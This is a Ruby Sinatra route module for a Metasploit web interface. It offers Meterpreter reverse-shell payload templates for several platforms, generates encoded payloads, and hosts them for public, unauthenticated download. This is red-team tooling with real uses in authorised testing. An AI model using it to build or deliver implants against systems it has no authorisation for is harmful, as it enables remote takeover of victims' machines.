# frozen_string_literal: true

require 'sinatra/base'
require 'securerandom'
require 'fileutils'
require 'base64'

module MsfGui
  module Routes
    class Payloads < Sinatra::Base
      helpers Helpers::Response
      helpers Helpers::Validators

      configure do
        set :show_exceptions, false
      end

      FORMATS = {
        executable: %w[exe dll msi elf apk macho],
        transform: %w[hex c csharp python powershell bash base64 raw],
        web: %w[asp aspx jsp war php vba vbs hta]
      }.freeze

      COMMON_TEMPLATES = [
        {
          name: 'Windows Meterpreter Reverse TCP',
          payload: 'windows/meterpreter/reverse_tcp',
          format: 'exe',
          platform: 'windows',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        },
        {
          name: 'Windows Meterpreter Reverse HTTPS',
          payload: 'windows/meterpreter/reverse_https',
          format: 'exe',
          platform: 'windows',
          options: { 'LHOST' => '', 'LPORT' => '443' }
        },
        {
          name: 'Linux Meterpreter Reverse TCP',
          payload: 'linux/x64/meterpreter/reverse_tcp',
          format: 'elf',
          platform: 'linux',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        },
        {
          name: 'Android Meterpreter Reverse TCP',
          payload: 'android/meterpreter/reverse_tcp',
          format: 'apk',
          platform: 'android',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        },
        {
          name: 'macOS Meterpreter Reverse TCP',
          payload: 'osx/x64/meterpreter/reverse_tcp',
          format: 'macho',
          platform: 'macos',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        },
        {
          name: 'PHP Meterpreter Reverse TCP',
          payload: 'php/meterpreter/reverse_tcp',
          format: 'raw',
          platform: 'php',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        },
        {
          name: 'Python Meterpreter Reverse TCP',
          payload: 'python/meterpreter/reverse_tcp',
          format: 'raw',
          platform: 'python',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        },
        {
          name: 'PowerShell Reverse TCP',
          payload: 'windows/x64/powershell_reverse_tcp',
          format: 'raw',
          platform: 'windows',
          options: { 'LHOST' => '', 'LPORT' => '4444' }
        }
      ].freeze

      # Get available formats
      get '/formats' do
        json_response(FORMATS)
      end

      # Get encoders
      get '/encoders' do
        encoders = MsfGui.msf_client.list_encoders_detailed
        json_response(encoders)
      rescue StandardError => e
        # Fallback to simple list
        encoders = MsfGui.msf_client.list_encoders
        json_response(encoders.map { |name| { name: name } })
      end

      # Get common payload templates
      get '/templates' do
        json_response(COMMON_TEMPLATES)
      end

      # Get payload options
      get '/:payload_name/options' do
        payload_name = params[:payload_name]

        if params[:splat] && !params[:splat].empty?
          payload_name = "#{payload_name}/#{params[:splat].join('/')}"
        end

        payload_name = URI.decode_www_form_component(payload_name) if payload_name.include?('%')

        info = MsfGui.msf_client.get_module_info('payload', payload_name)

        if info['error']
          json_error('Payload not found', status: 404)
        end

        json_response({
          name: info['name'],
          description: info['description'],
          options: info['options'],
          platform: info['platform'],
          arch: info['arch']
        })
      end

      # Generate payload (returns file)
      post '/generate' do
        body = parse_json_body

        payload = body[:payload] || body['payload']
        options = body[:options] || body['options'] || {}
        format = body[:format] || body['format'] || 'raw'
        encoder = body[:encoder] || body['encoder']
        iterations = (body[:iterations] || body['iterations'] || 1).to_i
        bad_chars = body[:bad_chars] || body['bad_chars']

        unless payload
          json_error('Payload name is required', status: 422)
        end

        begin
          data = MsfGui.msf_client.generate_payload(
            payload,
            options,
            format: format,
            encoder: encoder,
            iterations: iterations,
            bad_chars: bad_chars
          )

          # Determine content type and filename
          content_type_map = {
            'exe' => 'application/x-msdownload',
            'dll' => 'application/x-msdownload',
            'msi' => 'application/x-msi',
            'elf' => 'application/x-executable',
            'apk' => 'application/vnd.android.package-archive',
            'macho' => 'application/x-mach-binary',
            'raw' => 'application/octet-stream'
          }

          ext = format == 'raw' ? 'bin' : format
          filename = "payload.#{ext}"

          content_type content_type_map[format] || 'application/octet-stream'
          headers['Content-Disposition'] = "attachment; filename=\"#{filename}\""

          data
        rescue MsfClient::RPCError => e
          json_error("Payload generation failed: #{e.message}", status: 500)
        end
      end

      # Generate and host payload
      post '/host' do
        body = parse_json_body

        payload = body[:payload] || body['payload']
        options = body[:options] || body['options'] || {}
        format = body[:format] || body['format'] || 'raw'
        encoder = body[:encoder] || body['encoder']
        iterations = (body[:iterations] || body['iterations'] || 1).to_i
        bad_chars = body[:bad_chars] || body['bad_chars']
        custom_path = body[:path] || body['path']
        expiry_hours = (body[:expiry_hours] || body['expiry_hours'] || 24).to_i

        unless payload
          json_error('Payload name is required', status: 422)
        end

        begin
          data = MsfGui.msf_client.generate_payload(
            payload,
            options,
            format: format,
            encoder: encoder,
            iterations: iterations,
            bad_chars: bad_chars
          )

          # Generate unique ID and filename
          payload_id = SecureRandom.uuid
          ext = format == 'raw' ? 'bin' : format
          filename = "#{payload_id}.#{ext}"

          # Use custom path or default
          url_path = custom_path || payload_id

          # Save to hosted directory
          FileUtils.mkdir_p(Settings.hosted_payloads_path)
          filepath = File.join(Settings.hosted_payloads_path, filename)
          File.binwrite(filepath, data)

          # Save metadata
          payload_info = {
            id: payload_id,
            payload: payload,
            format: format,
            filename: filename,
            path: url_path,
            size: data.bytesize,
            created_at: Time.now.iso8601,
            expires_at: (Time.now + expiry_hours * 3600).iso8601,
            downloads: 0,
            options: options
          }

          Stores.hosted_payloads.update do |payloads|
            payloads[payload_id] = payload_info
            payloads
          end

          # Build download URL
          host = request.host
          port = Settings.server_port
          scheme = request.scheme
          download_url = "#{scheme}://#{host}:#{port}/dl/#{url_path}"

          json_response({
            id: payload_id,
            url: download_url,
            filename: filename,
            size: data.bytesize,
            expires_at: payload_info[:expires_at]
          }, status: 201)
        rescue MsfClient::RPCError => e
          json_error("Payload generation failed: #{e.message}", status: 500)
        end
      end

      # List hosted payloads
      get '/hosted' do
        payloads = Stores.hosted_payloads.load({})

        # Filter expired payloads
        now = Time.now
        active = payloads.values.select do |p|
          expires = Time.parse(p[:expires_at] || p['expires_at'])
          expires > now
        end

        json_response(active)
      end

      # Delete hosted payload
      delete '/hosted/:payload_id' do
        payload_id = params[:payload_id]

        payloads = Stores.hosted_payloads.load({})
        payload = payloads[payload_id] || payloads[payload_id.to_sym]

        unless payload
          json_error('Payload not found', status: 404)
        end

        # Delete file
        filename = payload[:filename] || payload['filename']
        filepath = File.join(Settings.hosted_payloads_path, filename)
        FileUtils.rm_f(filepath)

        # Remove from store
        Stores.hosted_payloads.update do |p|
          p.delete(payload_id)
          p.delete(payload_id.to_sym)
          p
        end

        json_response({ success: true, message: 'Payload deleted' })
      end

      # Download hosted payload (public endpoint - no auth)
      get '/download/:payload_id/*' do
        payload_id = params[:payload_id]
        filename = params[:splat]&.first

        payloads = Stores.hosted_payloads.load({})
        payload = payloads[payload_id] || payloads[payload_id.to_sym]

        # Also check by custom path
        unless payload
          payload = payloads.values.find do |p|
            (p[:path] || p['path']) == payload_id
          end
        end

        unless payload
          halt 404, 'Not found'
        end

        # Check expiry
        expires = Time.parse(payload[:expires_at] || payload['expires_at'])
        if Time.now > expires
          halt 410, 'Payload expired'
        end

        # Increment download counter
        Stores.hosted_payloads.update do |p|
          id = payload[:id] || payload['id']
          if p[id]
            p[id][:downloads] = (p[id][:downloads] || 0) + 1
          elsif p[id.to_sym]
            p[id.to_sym][:downloads] = (p[id.to_sym][:downloads] || 0) + 1
          end
          p
        end

        # Serve file
        stored_filename = payload[:filename] || payload['filename']
        filepath = File.join(Settings.hosted_payloads_path, stored_filename)

        unless File.exist?(filepath)
          halt 404, 'File not found'
        end

        send_file filepath,
                  filename: filename || stored_filename,
                  type: 'application/octet-stream'
      end
    end
  end
end
